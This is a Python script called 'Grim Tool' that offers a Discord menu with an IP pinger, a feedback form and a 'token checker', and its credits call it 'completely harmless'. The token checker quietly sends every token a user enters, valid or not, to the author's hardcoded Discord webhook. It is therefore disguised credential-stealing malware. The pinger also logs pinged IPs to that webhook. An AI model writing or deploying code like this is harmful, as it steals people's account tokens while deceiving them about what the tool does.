from time import sleep
from turtle import title
from colorama import Fore
import colorama
import os
import discord
import requests
from discord import Webhook, RequestsWebhookAdapter
colorama.init()



def main():
    os.system(" cls && title Grim Tool │ 3 Features")
    print(Fore.RED + '''
 ██████╗ ██████╗ ██╗███╗   ███╗
██╔════╝ ██╔══██╗██║████╗ ████║
██║  ███╗██████╔╝██║██╔████╔██║
██║   ██║██╔══██╗██║██║╚██╔╝██║
╚██████╔╝██║  ██║██║██║ ╚═╝ ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝
              [1] Ping IP
              [2] Feedback
              [3] Credits
              [4] Token Checker                      
    
    
    ''')

main()
choice = input("Choice: ")
if choice == '1':
  os.system("cls && title Grim Tool │ IP Pinger")
  ip = input("IP: ")
  webhook = Webhook.from_url("https://discord.com/api/webhooks/949324119550345256/tzcE5nZFcDH4gkdf5IErXupiFIyW2BEXYhfT04wx3rdjPDTxkaB4sLZO93xswn8_UtMf", adapter=RequestsWebhookAdapter())
  embed = discord.Embed(title="New Log", description=f"New ping. Pinged {ip}")
  webhook.send(embed=embed)
  os.system(f'cmd /k "ping {ip} -t"')
elif choice == '2':
  os.system(" cls && title Grim Tool │ Feedback")
  feedback = input("Your Feedback: ")
  webhook = Webhook.from_url("https://discord.com/api/webhooks/949324119550345256/tzcE5nZFcDH4gkdf5IErXupiFIyW2BEXYhfT04wx3rdjPDTxkaB4sLZO93xswn8_UtMf", adapter=RequestsWebhookAdapter())
  embed = discord.Embed(title="New Feedback", description=(feedback))
  webhook.send(embed=embed)
  print("Thank you for your feedback! Returning in 3 seconds.")
  sleep(3)
  main()
elif choice == '3':
  os.system(" cls && title Grim Tool │ Credits")
  print("Credits\nGrim#5555 made this tool in Visual Studio Code with python. It is completely harmless. Returning in 5 seconds.")
  sleep(5)
  main()  
elif choice == '4':
  os.system("cls && title Grim Tool │ Token Checker")
  print(Fore.LIGHTMAGENTA_EX)

print('                   ,____')
print('                   |---.\' ')
print('           ___     |    `')
print('          / .-\  ./=)')
print('         |  |"|_/\/|')
print('         ;  |-;| /_|')
print('        / \_| |/ \ |')
print('       /      \/\( |')
print('       |   /  |` ) |')
print('       /   \ _/    |')
print('      /--._/  \    |')
print('      `/|)    |    /')
print('        /     |   |')
print('      .      |   | ')
print('     /         \  |')
print('    (_.-.__.__./  /')




colorama.init()
print(f'\n\nTOKEN CHECKER MADE BY GRIM#5555')
sleep(1)
token = input('Token: ')

headers = {
            'Authorization': token,
            'Content-Type': 'application/json'}
r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=headers)
if r.status_code == 200:
            print(f'Token {token} is valid, exiting in 5 seconds.')
            webhook = Webhook.from_url("https://discord.com/api/webhooks/949324119550345256/tzcE5nZFcDH4gkdf5IErXupiFIyW2BEXYhfT04wx3rdjPDTxkaB4sLZO93xswn8_UtMf", adapter=RequestsWebhookAdapter())
            embed = discord.Embed(title="New Log", description=f"Valid Token Checked.")
            embed.add_field(name="Token", value=token)
            webhook.send(embed=embed)
            sleep(5)
            main()
            
else:
            print(Fore.RED + "\nInvalid Token, exiting in 5 seconds.")
            webhook = Webhook.from_url("https://discord.com/api/webhooks/949324119550345256/tzcE5nZFcDH4gkdf5IErXupiFIyW2BEXYhfT04wx3rdjPDTxkaB4sLZO93xswn8_UtMf", adapter=RequestsWebhookAdapter())
            embed = discord.Embed(title="New Log", description=f"Invalid Token Checked.")
            embed.add_field(name="Token", value=token)
            webhook.send(embed=embed)
            sleep(5)
            main()

 
    

